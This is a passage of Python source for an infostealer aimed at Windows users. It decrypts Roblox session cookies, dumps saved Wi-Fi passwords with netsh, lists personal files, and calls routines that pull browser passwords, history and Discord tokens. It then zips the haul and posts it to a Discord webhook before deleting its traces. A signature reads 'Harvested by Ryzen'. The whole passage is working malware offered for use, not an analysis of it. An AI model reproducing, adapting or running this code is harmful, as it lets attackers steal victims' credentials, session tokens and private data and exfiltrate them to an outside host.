    if not os.path.exists(roblox_cookies_path):
        return None
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)
        encoded_cookies = file_content.get("CookiesData", "")
        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
        roblosecurity_match = re.search(r'\.ROBLOSECURITY\s+([^\s]+)', decrypted_text)
        if roblosecurity_match:
            return roblosecurity_match.group(1)
        return None
    except Exception:
        return None
    finally:
        if os.path.exists(destination_path):
            try:
                os.remove(destination_path)
            except:
                pass

def get_all_wifi_profiles():
    wifi_profiles = []
    try:
        profiles_output = subprocess.run('netsh wlan show profiles', shell=True, capture_output=True, text=True).stdout
        if not profiles_output or "No profiles" in profiles_output:
            return []
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)|User Profile\s*:\s*(.*)", profiles_output, re.IGNORECASE)
        for match in profile_names:
            name = next((n for n in match if n), None)
            if name:
                name = name.strip()
                detailed_output = subprocess.run(f'netsh wlan show profile name="{name}" key=clear', shell=True, capture_output=True, text=True).stdout
                key_match = re.search(r"Key Content\s*:\s*(.*)", detailed_output, re.IGNORECASE)
                wifi_profiles.append({
                    'ssid': name,
                    'password': key_match.group(1).strip() if key_match else 'Not found'
                })
        return wifi_profiles
    except:
        return []

def collect_file_inventory():
    home = Path.home()
    output = []

    folders = ["Desktop", "Downloads", "Documents", "Pictures", "Music", "Videos"]

    for folder in folders:
        folder_path = home / folder
        output.append(f"\n{'='*60}\n{folder.upper()}\n{'='*60}\n")

        if folder_path.exists():
            try:
                for item in folder_path.rglob("*"):
                    try:
                        if item.is_file():
                            output.append(str(item))
                    except:
                        continue
            except Exception as e:
                output.append(f"Access denied: {folder}\n")
        else:
            output.append(f"Folder not found: {folder}\n")

    if output:
        inventory_file = os.path.join(BASE_OUTPUT_DIR, "file_inventory.txt")
        with open(inventory_file, 'w', encoding='utf-8') as f:
            f.write("\n".join(output))
        return inventory_file
    return None

def send_zip_to_discord(zip_path):
    if not os.path.exists(zip_path):
        return False
    try:
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f)}
            response = requests.post(WEBHOOK_URL, files=files)
            return response.status_code in [200, 204]
    except:
        return False

def main():
    os.makedirs(BROWSERS_DIR, exist_ok=True)

    run_xaitax_extractor()
    run_firefox_extraction()
    run_opera_extraction()

    run_chromium_history_bookmarks()
    run_firefox_history_bookmarks()
    run_opera_history_bookmarks()

    ip_info = get_ip_info()
    if ip_info:
        ip_file = os.path.join(BASE_OUTPUT_DIR, "ip_info.txt")
        with open(ip_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("IP INFORMATION\n")
            f.write("="*60 + "\n\n")
            for key, value in ip_info.items():
                f.write(f"{key}: {value}\n")

    perf = TaskManagerPerformance()
    performance_data = perf.get_all_performance_data()
    system_info_text = perf.format_performance_text(performance_data)
    system_info_file = os.path.join(BASE_OUTPUT_DIR, "system_info.txt")
    with open(system_info_file, 'w', encoding='utf-8') as f:
        f.write(system_info_text)

    readme_content = "Harvested by Ryzen | Discord: stutter.ext | Telegram: xerf12"
    readme_file = os.path.join(BASE_OUTPUT_DIR, "README.txt")
    with open(readme_file, 'w', encoding='utf-8') as f:
        f.write(readme_content)

    discord_tokens = get_discord_tokens()
    if discord_tokens:
        discord_file = os.path.join(BASE_OUTPUT_DIR, "discord_tokens.txt")
        with open(discord_file, 'w', encoding='utf-8') as f:
            for token_info in discord_tokens:
                f.write(f"Token: {token_info['token']}\n")
                f.write(f"User ID: {token_info['user_id']}\n")
                f.write(f"Sources: {', '.join(token_info['sources'])}\n")
                f.write(f"{'='*60}\n")

    roblox_cookie = retrieve_roblox_cookies()
    if roblox_cookie:
        roblox_file = os.path.join(BASE_OUTPUT_DIR, "roblox_cookie.txt")
        with open(roblox_file, 'w', encoding='utf-8') as f:
            f.write(f".ROBLOSECURITY: {roblox_cookie}\n")

    wifi_profiles = get_all_wifi_profiles()
    if wifi_profiles:
        wifi_file = os.path.join(BASE_OUTPUT_DIR, "wifi_profiles.txt")
        with open(wifi_file, 'w', encoding='utf-8') as f:
            for wifi in wifi_profiles:
                f.write(f"SSID: {wifi['ssid']}\nPassword: {wifi['password']}\n{'='*50}\n")

    collect_file_inventory()

    if os.path.exists(BASE_OUTPUT_DIR):
        has_any_data = False
        for root, dirs, files in os.walk(BASE_OUTPUT_DIR):
            if files:
                has_any_data = True
                break

        if not has_any_data:
            os.rmdir(BASE_OUTPUT_DIR)
        else:
            final_zip = os.path.join(tempfile.gettempdir(), f"Complete_Extraction_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
            with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(BASE_OUTPUT_DIR):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, BASE_OUTPUT_DIR)
                        zipf.write(file_path, arcname)

            send_zip_to_discord(final_zip)

            try:
                os.remove(final_zip)
            except:
                pass

    try:
        shutil.rmtree(BASE_OUTPUT_DIR, ignore_errors=True)
    except:
        pass

if __name__ == "__main__":
    main()
